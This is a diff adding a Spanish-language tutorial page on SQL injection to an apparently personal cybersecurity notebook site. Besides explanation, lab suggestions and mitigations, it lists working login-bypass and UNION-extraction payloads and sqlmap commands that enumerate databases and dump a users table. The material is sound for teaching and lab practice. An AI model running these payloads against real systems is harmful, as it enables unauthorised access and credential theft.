@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection - Teoría</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>SQL Injection</h1>
+        <nav>
+            <ul>
+                <li><a href="index.html">Inicio</a></li>
+                <li><a href="dashboard.html">Máquinas Resueltas</a></li>
+                <li><a href="theory.html">Teoría</a></li>
+                <li><a href="writeup.html">Nuevo Write-up</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <article class="theory-content">
+            <section class="theory-intro">
+                <h2>Descripción Técnica</h2>
+                <p>SQL Injection es una vulnerabilidad que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Generalmente ocurre cuando una aplicación utiliza entrada del usuario para construir consultas SQL sin la debida validación.</p>
+            </section>
+
+            <section class="theory-details">
+                <h2>Cuándo se Usa</h2>
+                <ul>
+                    <li>Aplicaciones web que interactúan con bases de datos</li>
+                    <li>Formularios de login, búsqueda, filtros</li>
+                    <li>Cualquier punto donde la entrada del usuario se use en consultas SQL</li>
+                </ul>
+
+                <h2>Riesgos</h2>
+                <ul>
+                    <li>Acceso no autorizado a datos sensibles</li>
+                    <li>Modificación o eliminación de datos</li>
+                    <li>Ejecución de comandos administrativos en la base de datos</li>
+                    <li>Compromiso completo del servidor</li>
+                </ul>
+            </section>
+
+            <section class="theory-commands">
+                <h2>Comandos Clave</h2>
+                
+                <h3>Detección</h3>
+                <div class="code-block">
+                    <h4>Con sqlmap</h4>
+                    <pre><code>sqlmap -u "http://ejemplo.com/login.php" --data="user=admin&pass=test" --dbs</code></pre>
+                    
+                    <h4>Pruebas manuales</h4>
+                    <pre><code>' OR '1'='1
+' UNION SELECT 1,2,3--</code></pre>
+                </div>
+
+                <h3>Explotación</h3>
+                <div class="code-block">
+                    <h4>Enumerar bases de datos</h4>
+                    <pre><code>sqlmap -u "http://ejemplo.com/login.php" --dbs</code></pre>
+                    
+                    <h4>Enumerar tablas</h4>
+                    <pre><code>sqlmap -u "http://ejemplo.com/login.php" -D database --tables</code></pre>
+                    
+                    <h4>Extraer datos</h4>
+                    <pre><code>sqlmap -u "http://ejemplo.com/login.php" -D database -T users --dump</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-examples">
+                <h2>Ejemplos de Laboratorio</h2>
+                
+                <h3>Entorno Seguro</h3>
+                <ul>
+                    <li>DVWA (Damn Vulnerable Web Application)</li>
+                    <li>WebGoat</li>
+                    <li>Máquinas de HackTheBox/VulnHub</li>
+                </ul>
+
+                <h3>Práctica</h3>
+                <div class="code-block">
+                    <h4>Bypass de login</h4>
+                    <pre><code class="language-sql">-- Bypass de login
+' OR '1'='1' --</code></pre>
+                    
+                    <h4>Extraer información</h4>
+                    <pre><code class="language-sql">-- Extraer información
+' UNION SELECT username, password FROM users --</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-mitigation">
+                <h2>Mitigaciones</h2>
+                <ul>
+                    <li>Usar prepared statements</li>
+                    <li>Validar y sanitizar entrada</li>
+                    <li>Principio de mínimo privilegio</li>
+                    <li>WAF (Web Application Firewall)</li>
+                </ul>
+            </section>
+
+            <section class="related-writeups">
+                <h2>Write-ups Relacionados</h2>
+                <div id="sqli-writeups-list"></div>
+            </section>
+
+            <section class="theory-references">
+                <h2>Referencias</h2>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP SQL Injection Prevention Cheat Sheet</a></li>
+                </ul>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        <p>Cuaderno Personal de Ciberseguridad &copy; 2025</p>
+        <p class="warning">Recuerda redactar información sensible antes de publicar</p>
+    </footer>
+
+    <script src="js/theory.js"></script>
+</body>
+</html>
